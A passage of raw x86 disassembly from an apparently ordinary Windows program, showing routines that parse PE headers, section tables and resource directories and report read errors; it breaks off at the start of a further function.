  402b51:	53                   	push   %ebx
  402b52:	51                   	push   %ecx
  402b53:	68 80 00 00 00       	push   $0x80
  402b58:	8d 7c 24 48          	lea    0x48(%esp),%edi
  402b5c:	e8 4f fc ff ff       	call   0x4027b0
  402b61:	83 c4 10             	add    $0x10,%esp
  402b64:	85 c0                	test   %eax,%eax
  402b66:	0f 84 f8 03 00 00    	je     0x402f64
  402b6c:	81 3b 1f 85 c8 82    	cmpl   $0x82c8851f,(%ebx)
  402b72:	75 0a                	jne    0x402b7e
  402b74:	c7 85 a0 00 00 00 80 	movl   $0x80,0xa0(%ebp)
  402b7b:	00 00 00 
  402b7e:	8b 54 24 34          	mov    0x34(%esp),%edx
  402b82:	6a 14                	push   $0x14
  402b84:	53                   	push   %ebx
  402b85:	52                   	push   %edx
  402b86:	56                   	push   %esi
  402b87:	8d 7c 24 48          	lea    0x48(%esp),%edi
  402b8b:	e8 20 fc ff ff       	call   0x4027b0
  402b90:	83 c4 10             	add    $0x10,%esp
  402b93:	85 c0                	test   %eax,%eax
  402b95:	0f 84 c9 03 00 00    	je     0x402f64
  402b9b:	8b 44 24 34          	mov    0x34(%esp),%eax
  402b9f:	6a 02                	push   $0x2
  402ba1:	83 c6 14             	add    $0x14,%esi
  402ba4:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  402ba8:	83 d0 00             	adc    $0x0,%eax
  402bab:	51                   	push   %ecx
  402bac:	50                   	push   %eax
  402bad:	56                   	push   %esi
  402bae:	89 44 24 44          	mov    %eax,0x44(%esp)
  402bb2:	e8 f9 fb ff ff       	call   0x4027b0
  402bb7:	83 c4 10             	add    $0x10,%esp
  402bba:	85 c0                	test   %eax,%eax
  402bbc:	0f 84 a2 03 00 00    	je     0x402f64
  402bc2:	8b 44 24 28          	mov    0x28(%esp),%eax
  402bc6:	ba 0b 01 00 00       	mov    $0x10b,%edx
  402bcb:	66 3b c2             	cmp    %dx,%ax
  402bce:	75 2e                	jne    0x402bfe
  402bd0:	0f b7 4b 10          	movzwl 0x10(%ebx),%ecx
  402bd4:	66 83 f9 78          	cmp    $0x78,%cx
  402bd8:	73 0f                	jae    0x402be9
  402bda:	68 04 ab 41 00       	push   $0x41ab04
  402bdf:	68 48 02 00 00       	push   $0x248
  402be4:	e9 69 03 00 00       	jmp    0x402f52
  402be9:	b8 e0 00 00 00       	mov    $0xe0,%eax
  402bee:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%esp)
  402bf5:	00 
  402bf6:	89 44 24 14          	mov    %eax,0x14(%esp)
  402bfa:	33 d2                	xor    %edx,%edx
  402bfc:	eb 3d                	jmp    0x402c3b
  402bfe:	b9 0b 02 00 00       	mov    $0x20b,%ecx
  402c03:	66 3b c1             	cmp    %cx,%ax
  402c06:	0f 85 30 03 00 00    	jne    0x402f3c
  402c0c:	0f b7 4b 10          	movzwl 0x10(%ebx),%ecx
  402c10:	ba 88 00 00 00       	mov    $0x88,%edx
  402c15:	66 3b ca             	cmp    %dx,%cx
  402c18:	73 0f                	jae    0x402c29
  402c1a:	68 04 ab 41 00       	push   $0x41ab04
  402c1f:	68 4e 02 00 00       	push   $0x24e
  402c24:	e9 29 03 00 00       	jmp    0x402f52
  402c29:	33 d2                	xor    %edx,%edx
  402c2b:	c7 44 24 14 f0 00 00 	movl   $0xf0,0x14(%esp)
  402c32:	00 
  402c33:	8b 44 24 14          	mov    0x14(%esp),%eax
  402c37:	89 54 24 20          	mov    %edx,0x20(%esp)
  402c3b:	0f b7 c9             	movzwl %cx,%ecx
  402c3e:	3b c8                	cmp    %eax,%ecx
  402c40:	73 06                	jae    0x402c48
  402c42:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  402c46:	8b c1                	mov    %ecx,%eax
  402c48:	0f b7 4b 02          	movzwl 0x2(%ebx),%ecx
  402c4c:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  402c50:	3b c2                	cmp    %edx,%eax
  402c52:	74 22                	je     0x402c76
  402c54:	8b 54 24 34          	mov    0x34(%esp),%edx
  402c58:	50                   	push   %eax
  402c59:	53                   	push   %ebx
  402c5a:	52                   	push   %edx
  402c5b:	56                   	push   %esi
  402c5c:	8d 7c 24 48          	lea    0x48(%esp),%edi
  402c60:	e8 4b fb ff ff       	call   0x4027b0
  402c65:	83 c4 10             	add    $0x10,%esp
  402c68:	85 c0                	test   %eax,%eax
  402c6a:	0f 84 f4 02 00 00    	je     0x402f64
  402c70:	8b 44 24 14          	mov    0x14(%esp),%eax
  402c74:	33 d2                	xor    %edx,%edx
  402c76:	8d 4e 40             	lea    0x40(%esi),%ecx
  402c79:	89 4d 00             	mov    %ecx,0x0(%ebp)
  402c7c:	39 54 24 20          	cmp    %edx,0x20(%esp)
  402c80:	74 58                	je     0x402cda
  402c82:	8d 8e 80 00 00 00    	lea    0x80(%esi),%ecx
  402c88:	89 4d 04             	mov    %ecx,0x4(%ebp)
  402c8b:	8b 8b 80 00 00 00    	mov    0x80(%ebx),%ecx
  402c91:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  402c94:	8b 8b 84 00 00 00    	mov    0x84(%ebx),%ecx
  402c9a:	89 4d 14             	mov    %ecx,0x14(%ebp)
  402c9d:	8b 4b 40             	mov    0x40(%ebx),%ecx
  402ca0:	89 4d 10             	mov    %ecx,0x10(%ebp)
  402ca3:	b9 01 00 00 00       	mov    $0x1,%ecx
  402ca8:	c6 85 9c 00 00 00 00 	movb   $0x0,0x9c(%ebp)
  402caf:	66 39 4b 44          	cmp    %cx,0x44(%ebx)
  402cb3:	75 12                	jne    0x402cc7
  402cb5:	88 8d 9d 00 00 00    	mov    %cl,0x9d(%ebp)
  402cbb:	8b 7b 70             	mov    0x70(%ebx),%edi
  402cbe:	89 7c 24 20          	mov    %edi,0x20(%esp)
  402cc2:	8b 7b 74             	mov    0x74(%ebx),%edi
  402cc5:	eb 65                	jmp    0x402d2c
  402cc7:	c6 85 9d 00 00 00 00 	movb   $0x0,0x9d(%ebp)
  402cce:	8b 7b 70             	mov    0x70(%ebx),%edi
  402cd1:	89 7c 24 20          	mov    %edi,0x20(%esp)
  402cd5:	8b 7b 74             	mov    0x74(%ebx),%edi
  402cd8:	eb 52                	jmp    0x402d2c
  402cda:	8d 8e 90 00 00 00    	lea    0x90(%esi),%ecx
  402ce0:	89 4d 04             	mov    %ecx,0x4(%ebp)
  402ce3:	8b 8b 90 00 00 00    	mov    0x90(%ebx),%ecx
  402ce9:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  402cec:	8b 8b 94 00 00 00    	mov    0x94(%ebx),%ecx
  402cf2:	89 4d 14             	mov    %ecx,0x14(%ebp)
  402cf5:	8b 4b 40             	mov    0x40(%ebx),%ecx
  402cf8:	89 4d 10             	mov    %ecx,0x10(%ebp)
  402cfb:	b9 01 00 00 00       	mov    $0x1,%ecx
  402d00:	c6 85 9c 00 00 00 01 	movb   $0x1,0x9c(%ebp)
  402d07:	66 39 4b 44          	cmp    %cx,0x44(%ebx)
  402d0b:	75 08                	jne    0x402d15
  402d0d:	88 8d 9d 00 00 00    	mov    %cl,0x9d(%ebp)
  402d13:	eb 07                	jmp    0x402d1c
  402d15:	c6 85 9d 00 00 00 00 	movb   $0x0,0x9d(%ebp)
  402d1c:	8b bb 80 00 00 00    	mov    0x80(%ebx),%edi
  402d22:	89 7c 24 20          	mov    %edi,0x20(%esp)
  402d26:	8b bb 84 00 00 00    	mov    0x84(%ebx),%edi
  402d2c:	89 7c 24 24          	mov    %edi,0x24(%esp)
  402d30:	8b 7d 04             	mov    0x4(%ebp),%edi
  402d33:	83 c7 04             	add    $0x4,%edi
  402d36:	03 f0                	add    %eax,%esi
  402d38:	11 54 24 34          	adc    %edx,0x34(%esp)
  402d3c:	89 7d 08             	mov    %edi,0x8(%ebp)
  402d3f:	89 74 24 30          	mov    %esi,0x30(%esp)
  402d43:	89 55 18             	mov    %edx,0x18(%ebp)
  402d46:	c6 85 9e 00 00 00 00 	movb   $0x0,0x9e(%ebp)
  402d4d:	89 b5 b0 00 00 00    	mov    %esi,0xb0(%ebp)
  402d53:	39 95 a0 00 00 00    	cmp    %edx,0xa0(%ebp)
  402d59:	74 16                	je     0x402d71
  402d5b:	80 bd 9c 00 00 00 00 	cmpb   $0x0,0x9c(%ebp)
  402d62:	75 0d                	jne    0x402d71
  402d64:	80 bd 9d 00 00 00 00 	cmpb   $0x0,0x9d(%ebp)
  402d6b:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  402d6f:	75 04                	jne    0x402d75
  402d71:	89 54 24 14          	mov    %edx,0x14(%esp)
  402d75:	39 54 24 20          	cmp    %edx,0x20(%esp)
  402d79:	75 0a                	jne    0x402d85
  402d7b:	39 54 24 14          	cmp    %edx,0x14(%esp)
  402d7f:	0f 84 ad 01 00 00    	je     0x402f32
  402d85:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  402d89:	b8 33 03 00 00       	mov    $0x333,%eax
  402d8e:	8b d0                	mov    %eax,%edx
  402d90:	89 44 24 28          	mov    %eax,0x28(%esp)
  402d94:	66 3b ca             	cmp    %dx,%cx
  402d97:	76 06                	jbe    0x402d9f
  402d99:	89 44 24 10          	mov    %eax,0x10(%esp)
  402d9d:	eb 12                	jmp    0x402db1
  402d9f:	b8 ff ff 00 00       	mov    $0xffff,%eax
  402da4:	66 3b c8             	cmp    %ax,%cx
  402da7:	75 08                	jne    0x402db1
  402da9:	c7 44 24 10 fe ff 00 	movl   $0xfffe,0x10(%esp)
  402db0:	00 
  402db1:	0f b7 74 24 10       	movzwl 0x10(%esp),%esi
  402db6:	8d 34 b6             	lea    (%esi,%esi,4),%esi
  402db9:	03 f6                	add    %esi,%esi
  402dbb:	03 f6                	add    %esi,%esi
  402dbd:	03 f6                	add    %esi,%esi
  402dbf:	8b c6                	mov    %esi,%eax
  402dc1:	e8 ca f8 ff ff       	call   0x402690
  402dc6:	89 44 24 18          	mov    %eax,0x18(%esp)
  402dca:	85 c0                	test   %eax,%eax
  402dcc:	75 1b                	jne    0x402de9
  402dce:	68 dc a8 41 00       	push   $0x41a8dc
  402dd3:	68 89 02 00 00       	push   $0x289
  402dd8:	68 70 aa 41 00       	push   $0x41aa70
  402ddd:	33 d2                	xor    %edx,%edx
  402ddf:	e8 2c 34 00 00       	call   0x406210
  402de4:	e9 78 01 00 00       	jmp    0x402f61
  402de9:	85 f6                	test   %esi,%esi
  402deb:	74 24                	je     0x402e11
  402ded:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  402df1:	8b 54 24 30          	mov    0x30(%esp),%edx
  402df5:	56                   	push   %esi
  402df6:	50                   	push   %eax
  402df7:	51                   	push   %ecx
  402df8:	52                   	push   %edx
  402df9:	8d 7c 24 48          	lea    0x48(%esp),%edi
  402dfd:	e8 ae f9 ff ff       	call   0x4027b0
  402e02:	83 c4 10             	add    $0x10,%esp
  402e05:	85 c0                	test   %eax,%eax
  402e07:	0f 84 57 01 00 00    	je     0x402f64
  402e0d:	8b 44 24 18          	mov    0x18(%esp),%eax
  402e11:	01 b5 b0 00 00 00    	add    %esi,0xb0(%ebp)
  402e17:	83 7c 24 14 00       	cmpl   $0x0,0x14(%esp)
  402e1c:	8b 74 24 10          	mov    0x10(%esp),%esi
  402e20:	74 2e                	je     0x402e50
  402e22:	33 ff                	xor    %edi,%edi
  402e24:	33 d2                	xor    %edx,%edx
  402e26:	8b c8                	mov    %eax,%ecx
  402e28:	66 3b fe             	cmp    %si,%di
  402e2b:	73 23                	jae    0x402e50
  402e2d:	8d 49 00             	lea    0x0(%ecx),%ecx
  402e30:	81 39 49 4e 49 54    	cmpl   $0x54494e49,(%ecx)
  402e36:	75 06                	jne    0x402e3e
  402e38:	80 79 04 00          	cmpb   $0x0,0x4(%ecx)
  402e3c:	74 0b                	je     0x402e49
  402e3e:	42                   	inc    %edx
  402e3f:	83 c1 28             	add    $0x28,%ecx
  402e42:	66 3b d6             	cmp    %si,%dx
  402e45:	72 e9                	jb     0x402e30
  402e47:	eb 07                	jmp    0x402e50
  402e49:	c6 85 9e 00 00 00 01 	movb   $0x1,0x9e(%ebp)
  402e50:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  402e54:	8b 54 24 20          	mov    0x20(%esp),%edx
  402e58:	51                   	push   %ecx
  402e59:	e8 f2 01 00 00       	call   0x403050
  402e5e:	8b f0                	mov    %eax,%esi
  402e60:	83 c4 04             	add    $0x4,%esp
  402e63:	89 74 24 20          	mov    %esi,0x20(%esp)
  402e67:	85 f6                	test   %esi,%esi
  402e69:	0f 84 c3 00 00 00    	je     0x402f32
  402e6f:	6a 0a                	push   $0xa
  402e71:	56                   	push   %esi
  402e72:	8d 44 24 40          	lea    0x40(%esp),%eax
  402e76:	e8 25 01 00 00       	call   0x402fa0
  402e7b:	83 c4 08             	add    $0x8,%esp
  402e7e:	85 c0                	test   %eax,%eax
  402e80:	0f 84 ac 00 00 00    	je     0x402f32
  402e86:	8b 40 04             	mov    0x4(%eax),%eax
  402e89:	85 c0                	test   %eax,%eax
  402e8b:	0f 89 a1 00 00 00    	jns    0x402f32
  402e91:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  402e96:	03 c6                	add    %esi,%eax
  402e98:	68 60 03 00 00       	push   $0x360
  402e9d:	50                   	push   %eax
  402e9e:	8d 44 24 40          	lea    0x40(%esp),%eax
  402ea2:	e8 f9 00 00 00       	call   0x402fa0
  402ea7:	83 c4 08             	add    $0x8,%esp
  402eaa:	85 c0                	test   %eax,%eax
  402eac:	0f 84 80 00 00 00    	je     0x402f32
  402eb2:	8b 40 04             	mov    0x4(%eax),%eax
  402eb5:	85 c0                	test   %eax,%eax
  402eb7:	79 79                	jns    0x402f32
  402eb9:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  402ebe:	03 c6                	add    %esi,%eax
  402ec0:	6a 00                	push   $0x0
  402ec2:	50                   	push   %eax
  402ec3:	8d 44 24 40          	lea    0x40(%esp),%eax
  402ec7:	e8 d4 00 00 00       	call   0x402fa0
  402ecc:	83 c4 08             	add    $0x8,%esp
  402ecf:	85 c0                	test   %eax,%eax
  402ed1:	74 5f                	je     0x402f32
  402ed3:	8b 40 04             	mov    0x4(%eax),%eax
  402ed6:	85 c0                	test   %eax,%eax
  402ed8:	78 58                	js     0x402f32
  402eda:	6a 10                	push   $0x10
  402edc:	33 c9                	xor    %ecx,%ecx
  402ede:	53                   	push   %ebx
  402edf:	03 c6                	add    %esi,%eax
  402ee1:	51                   	push   %ecx
  402ee2:	50                   	push   %eax
  402ee3:	8d 7c 24 48          	lea    0x48(%esp),%edi
  402ee7:	e8 c4 f8 ff ff       	call   0x4027b0
  402eec:	83 c4 10             	add    $0x10,%esp
  402eef:	85 c0                	test   %eax,%eax
  402ef1:	74 71                	je     0x402f64
  402ef3:	81 7b 04 80 00 00 00 	cmpl   $0x80,0x4(%ebx)
  402efa:	75 36                	jne    0x402f32
  402efc:	8b 74 24 10          	mov    0x10(%esp),%esi
  402f00:	8b 44 24 18          	mov    0x18(%esp),%eax
  402f04:	8b 13                	mov    (%ebx),%edx
  402f06:	68 80 00 00 00       	push   $0x80
  402f0b:	e8 40 01 00 00       	call   0x403050
  402f10:	83 c4 04             	add    $0x4,%esp
  402f13:	68 80 00 00 00       	push   $0x80
  402f18:	8d 55 1c             	lea    0x1c(%ebp),%edx
  402f1b:	52                   	push   %edx
  402f1c:	6a 00                	push   $0x0
  402f1e:	50                   	push   %eax
  402f1f:	e8 8c f8 ff ff       	call   0x4027b0
  402f24:	83 c4 10             	add    $0x10,%esp
  402f27:	85 c0                	test   %eax,%eax
  402f29:	74 39                	je     0x402f64
  402f2b:	8b 44 24 20          	mov    0x20(%esp),%eax
  402f2f:	89 45 18             	mov    %eax,0x18(%ebp)
  402f32:	c7 44 24 1c 01 00 00 	movl   $0x1,0x1c(%esp)
  402f39:	00 
  402f3a:	eb 28                	jmp    0x402f64
  402f3c:	68 18 ab 41 00       	push   $0x41ab18
  402f41:	68 52 02 00 00       	push   $0x252
  402f46:	eb 0a                	jmp    0x402f52
  402f48:	68 ec aa 41 00       	push   $0x41aaec
  402f4d:	68 29 02 00 00       	push   $0x229
  402f52:	68 70 aa 41 00       	push   $0x41aa70
  402f57:	ba 01 00 00 00       	mov    $0x1,%edx
  402f5c:	e8 df 33 00 00       	call   0x406340
  402f61:	83 c4 0c             	add    $0xc,%esp
  402f64:	8b 44 24 60          	mov    0x60(%esp),%eax
  402f68:	85 c0                	test   %eax,%eax
  402f6a:	74 09                	je     0x402f75
  402f6c:	50                   	push   %eax
  402f6d:	e8 a2 7b 00 00       	call   0x40ab14
  402f72:	83 c4 04             	add    $0x4,%esp
  402f75:	8b 44 24 18          	mov    0x18(%esp),%eax
  402f79:	85 c0                	test   %eax,%eax
  402f7b:	74 09                	je     0x402f86
  402f7d:	50                   	push   %eax
  402f7e:	e8 91 7b 00 00       	call   0x40ab14
  402f83:	83 c4 04             	add    $0x4,%esp
  402f86:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402f8a:	5f                   	pop    %edi
  402f8b:	5e                   	pop    %esi
  402f8c:	5d                   	pop    %ebp
  402f8d:	5b                   	pop    %ebx
  402f8e:	83 c4 58             	add    $0x58,%esp
  402f91:	c3                   	ret
  402f92:	cc                   	int3
  402f93:	cc                   	int3
  402f94:	cc                   	int3
  402f95:	cc                   	int3
  402f96:	cc                   	int3
  402f97:	cc                   	int3
  402f98:	cc                   	int3
  402f99:	cc                   	int3
  402f9a:	cc                   	int3
  402f9b:	cc                   	int3
  402f9c:	cc                   	int3
  402f9d:	cc                   	int3
  402f9e:	cc                   	int3
  402f9f:	cc                   	int3
  402fa0:	55                   	push   %ebp
  402fa1:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  402fa5:	56                   	push   %esi
  402fa6:	57                   	push   %edi
  402fa7:	6a 10                	push   $0x10
  402fa9:	53                   	push   %ebx
  402faa:	6a 00                	push   $0x0
  402fac:	8b f8                	mov    %eax,%edi
  402fae:	55                   	push   %ebp
  402faf:	e8 fc f7 ff ff       	call   0x4027b0
  402fb4:	83 c4 10             	add    $0x10,%esp
  402fb7:	85 c0                	test   %eax,%eax
  402fb9:	0f 84 7c 00 00 00    	je     0x40303b
  402fbf:	66 8b 43 0e          	mov    0xe(%ebx),%ax
  402fc3:	66 03 43 0c          	add    0xc(%ebx),%ax
  402fc7:	b9 00 10 00 00       	mov    $0x1000,%ecx
  402fcc:	0f b7 f0             	movzwl %ax,%esi
  402fcf:	83 c5 10             	add    $0x10,%ebp
  402fd2:	66 3b f1             	cmp    %cx,%si
  402fd5:	76 02                	jbe    0x402fd9
  402fd7:	8b f1                	mov    %ecx,%esi
  402fd9:	0f b7 c6             	movzwl %si,%eax
  402fdc:	03 c0                	add    %eax,%eax
  402fde:	03 c0                	add    %eax,%eax
  402fe0:	03 c0                	add    %eax,%eax
  402fe2:	74 11                	je     0x402ff5
  402fe4:	50                   	push   %eax
  402fe5:	53                   	push   %ebx
  402fe6:	6a 00                	push   $0x0
  402fe8:	55                   	push   %ebp
  402fe9:	e8 c2 f7 ff ff       	call   0x4027b0
  402fee:	83 c4 10             	add    $0x10,%esp
  402ff1:	85 c0                	test   %eax,%eax
  402ff3:	74 46                	je     0x40303b
  402ff5:	ba ff ff 00 00       	mov    $0xffff,%edx
  402ffa:	8b c3                	mov    %ebx,%eax
  402ffc:	66 3b f2             	cmp    %dx,%si
  402fff:	75 05                	jne    0x403006
  403001:	be fe ff 00 00       	mov    $0xfffe,%esi
  403006:	33 d2                	xor    %edx,%edx
  403008:	33 c9                	xor    %ecx,%ecx
  40300a:	66 3b d6             	cmp    %si,%dx
  40300d:	73 2c                	jae    0x40303b
  40300f:	90                   	nop
  403010:	f7 00 00 00 00 80    	testl  $0x80000000,(%eax)
  403016:	75 0f                	jne    0x403027
  403018:	8b 54 24 14          	mov    0x14(%esp),%edx
  40301c:	85 d2                	test   %edx,%edx
  40301e:	74 16                	je     0x403036
  403020:	0f b7 38             	movzwl (%eax),%edi
  403023:	3b fa                	cmp    %edx,%edi
  403025:	74 0f                	je     0x403036
  403027:	41                   	inc    %ecx
  403028:	83 c0 08             	add    $0x8,%eax
  40302b:	66 3b ce             	cmp    %si,%cx
  40302e:	72 e0                	jb     0x403010
  403030:	33 c0                	xor    %eax,%eax
  403032:	5f                   	pop    %edi
  403033:	5e                   	pop    %esi
  403034:	5d                   	pop    %ebp
  403035:	c3                   	ret
  403036:	66 3b ce             	cmp    %si,%cx
  403039:	72 02                	jb     0x40303d
  40303b:	33 c0                	xor    %eax,%eax
  40303d:	5f                   	pop    %edi
  40303e:	5e                   	pop    %esi
  40303f:	5d                   	pop    %ebp
  403040:	c3                   	ret
  403041:	cc                   	int3
  403042:	cc                   	int3
  403043:	cc                   	int3
  403044:	cc                   	int3
  403045:	cc                   	int3
  403046:	cc                   	int3
  403047:	cc                   	int3
  403048:	cc                   	int3
  403049:	cc                   	int3
  40304a:	cc                   	int3
  40304b:	cc                   	int3
  40304c:	cc                   	int3
  40304d:	cc                   	int3
  40304e:	cc                   	int3
  40304f:	cc                   	int3
  403050:	57                   	push   %edi
  403051:	33 ff                	xor    %edi,%edi
  403053:	33 c9                	xor    %ecx,%ecx
  403055:	66 3b fe             	cmp    %si,%di
  403058:	5f                   	pop    %edi
  403059:	73 18                	jae    0x403073
  40305b:	eb 03                	jmp    0x403060
  40305d:	8d 49 00             	lea    0x0(%ecx),%ecx
  403060:	3b 50 0c             	cmp    0xc(%eax),%edx
  403063:	72 09                	jb     0x40306e
  403065:	41                   	inc    %ecx
  403066:	83 c0 28             	add    $0x28,%eax
  403069:	66 3b ce             	cmp    %si,%cx
  40306c:	72 f2                	jb     0x403060
  40306e:	66 85 c9             	test   %cx,%cx
  403071:	75 1c                	jne    0x40308f
  403073:	68 30 ab 41 00       	push   $0x41ab30
  403078:	68 fc 02 00 00       	push   $0x2fc
  40307d:	68 70 aa 41 00       	push   $0x41aa70
  403082:	33 d2                	xor    %edx,%edx
  403084:	e8 87 31 00 00       	call   0x406210
  403089:	83 c4 0c             	add    $0xc,%esp
  40308c:	33 c0                	xor    %eax,%eax
  40308e:	c3                   	ret
  40308f:	2b 50 e4             	sub    -0x1c(%eax),%edx
  403092:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403096:	83 e8 28             	sub    $0x28,%eax
  403099:	03 ca                	add    %edx,%ecx
  40309b:	3b 48 08             	cmp    0x8(%eax),%ecx
  40309e:	77 0b                	ja     0x4030ab
  4030a0:	3b 48 10             	cmp    0x10(%eax),%ecx
  4030a3:	77 06                	ja     0x4030ab
  4030a5:	8b 40 14             	mov    0x14(%eax),%eax
  4030a8:	03 c2                	add    %edx,%eax
  4030aa:	c3                   	ret
  4030ab:	68 48 ab 41 00       	push   $0x41ab48
  4030b0:	68 01 03 00 00       	push   $0x301
  4030b5:	68 70 aa 41 00       	push   $0x41aa70
  4030ba:	33 d2                	xor    %edx,%edx
  4030bc:	e8 4f 31 00 00       	call   0x406210
  4030c1:	83 c4 0c             	add    $0xc,%esp
  4030c4:	33 c0                	xor    %eax,%eax
  4030c6:	c3                   	ret
  4030c7:	cc                   	int3
  4030c8:	cc                   	int3
  4030c9:	cc                   	int3
  4030ca:	cc                   	int3
  4030cb:	cc                   	int3
  4030cc:	cc                   	int3
  4030cd:	cc                   	int3
  4030ce:	cc                   	int3
  4030cf:	cc                   	int3
  4030d0:	83 ec 28             	sub    $0x28,%esp
  4030d3:	a1 08 d6 41 00       	mov    0x41d608,%eax
  4030d8:	33 c4                	xor    %esp,%eax
  4030da:	89 44 24 24          	mov    %eax,0x24(%esp)
  4030de:	8b 44 24 38          	mov    0x38(%esp),%eax
  4030e2:	53                   	push   %ebx
  4030e3:	55                   	push   %ebp
  4030e4:	33 db                	xor    %ebx,%ebx
  4030e6:	56                   	push   %esi
  4030e7:	8b f1                	mov    %ecx,%esi
  4030e9:	89 74 24 20          	mov    %esi,0x20(%esp)
  4030ed:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4030f1:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  4030f5:	3b c3                	cmp    %ebx,%eax
  4030f7:	75 0a                	jne    0x403103
  4030f9:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  403100:	ff 
  403101:	eb 06                	jmp    0x403109
  403103:	8b 00                	mov    (%eax),%eax
  403105:	89 44 24 10          	mov    %eax,0x10(%esp)
  403109:	8b 6c 24 3c          	mov    0x3c(%esp),%ebp
  40310d:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  403111:	53                   	push   %ebx
  403112:	53                   	push   %ebx
  403113:	55                   	push   %ebp
  403114:	51                   	push   %ecx
  403115:	57                   	push   %edi
  403116:	ff 15 88 80 41 00    	call   *0x418088
  40311c:	85 c0                	test   %eax,%eax
  40311e:	0f 84 d4 00 00 00    	je     0x4031f8
  403124:	6a 00                	push   $0x0
  403126:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  40312a:	52                   	push   %edx
  40312b:	6a 08                	push   $0x8
  40312d:	8d 44 24 30          	lea    0x30(%esp),%eax
  403131:	50                   	push   %eax
  403132:	57                   	push   %edi
  403133:	ff 15 90 80 41 00    	call   *0x418090
  403139:	85 c0                	test   %eax,%eax
  40313b:	75 1e                	jne    0x40315b
  40313d:	68 90 aa 41 00       	push   $0x41aa90
  403142:	68 fc 00 00 00       	push   $0xfc
  403147:	68 70 aa 41 00       	push   $0x41aa70
  40314c:	33 d2                	xor    %edx,%edx
  40314e:	e8 bd 30 00 00       	call   0x406210
  403153:	83 c4 0c             	add    $0xc,%esp
  403156:	e9 d3 00 00 00       	jmp    0x40322e
  40315b:	b8 08 00 00 00       	mov    $0x8,%eax
  403160:	39 44 24 18          	cmp    %eax,0x18(%esp)
  403164:	74 1f                	je     0x403185
  403166:	68 ac aa 41 00       	push   $0x41aaac
  40316b:	68 fe 00 00 00       	push   $0xfe
  403170:	8d 50 f9             	lea    -0x7(%eax),%edx
  403173:	68 70 aa 41 00       	push   $0x41aa70
  403178:	e8 c3 31 00 00       	call   0x406340
  40317d:	83 c4 0c             	add    $0xc,%esp
  403180:	e9 a9 00 00 00       	jmp    0x40322e
  403185:	39 5c 24 40          	cmp    %ebx,0x40(%esp)
  403189:	74 40                	je     0x4031cb
  40318b:	8b d8                	mov    %eax,%ebx
  40318d:	39 44 24 10          	cmp    %eax,0x10(%esp)
  403191:	73 1e                	jae    0x4031b1
  403193:	68 60 ab 41 00       	push   $0x41ab60
  403198:	68 21 03 00 00       	push   $0x321
  40319d:	ba 05 00 00 00       	mov    $0x5,%edx
  4031a2:	68 70 aa 41 00       	push   $0x41aa70
  4031a7:	e8 94 31 00 00       	call   0x406340
  4031ac:	83 c4 0c             	add    $0xc,%esp
  4031af:	eb 7d                	jmp    0x40322e
  4031b1:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4031b5:	66 8b 54 24 28       	mov    0x28(%esp),%dx
  4031ba:	89 0e                	mov    %ecx,(%esi)
  4031bc:	66 8b 4c 24 2a       	mov    0x2a(%esp),%cx
  4031c1:	66 89 56 04          	mov    %dx,0x4(%esi)
  4031c5:	66 89 4e 06          	mov    %cx,0x6(%esi)
  4031c9:	eb 5b                	jmp    0x403226
  4031cb:	8b 74 24 24          	mov    0x24(%esp),%esi
  4031cf:	3b 74 24 10          	cmp    0x10(%esp),%esi
  4031d3:	76 0e                	jbe    0x4031e3
  4031d5:	68 60 ab 41 00       	push   $0x41ab60
  4031da:	8b de                	mov    %esi,%ebx
  4031dc:	68 2d 03 00 00       	push   $0x32d
  4031e1:	eb ba                	jmp    0x40319d
  4031e3:	8b 54 24 38          	mov    0x38(%esp),%edx
  4031e7:	33 db                	xor    %ebx,%ebx
  4031e9:	53                   	push   %ebx
  4031ea:	53                   	push   %ebx
  4031eb:	55                   	push   %ebp
  4031ec:	52                   	push   %edx
  4031ed:	57                   	push   %edi
  4031ee:	ff 15 88 80 41 00    	call   *0x418088
  4031f4:	85 c0                	test   %eax,%eax
  4031f6:	75 1b                	jne    0x403213
  4031f8:	68 44 aa 41 00       	push   $0x41aa44
  4031fd:	68 f9 00 00 00       	push   $0xf9
  403202:	68 70 aa 41 00       	push   $0x41aa70
  403207:	33 d2                	xor    %edx,%edx
  403209:	e8 02 30 00 00       	call   0x406210
  40320e:	83 c4 0c             	add    $0xc,%esp
  403211:	eb 1b                	jmp    0x40322e
  403213:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403217:	8b d7                	mov    %edi,%edx
  403219:	e8 32 f5 ff ff       	call   0x402750
  40321e:	85 c0                	test   %eax,%eax
  403220:	74 0c                	je     0x40322e
  403222:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  403226:	c7 44 24 14 01 00 00 	movl   $0x1,0x14(%esp)
  40322d:	00 
  40322e:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403232:	85 c0                	test   %eax,%eax
  403234:	74 02                	je     0x403238
  403236:	89 18                	mov    %ebx,(%eax)
  403238:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  40323c:	8b 44 24 14          	mov    0x14(%esp),%eax
  403240:	5e                   	pop    %esi
  403241:	5d                   	pop    %ebp
  403242:	5b                   	pop    %ebx
  403243:	33 cc                	xor    %esp,%ecx
  403245:	e8 05 5d 00 00       	call   0x408f4f
  40324a:	83 c4 28             	add    $0x28,%esp
  40324d:	c3                   	ret
  40324e:	cc                   	int3
  40324f:	cc                   	int3
  403250:	83 ec 18             	sub    $0x18,%esp
  403253:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  403257:	53                   	push   %ebx
  403258:	55                   	push   %ebp
  403259:	56                   	push   %esi
  40325a:	57                   	push   %edi
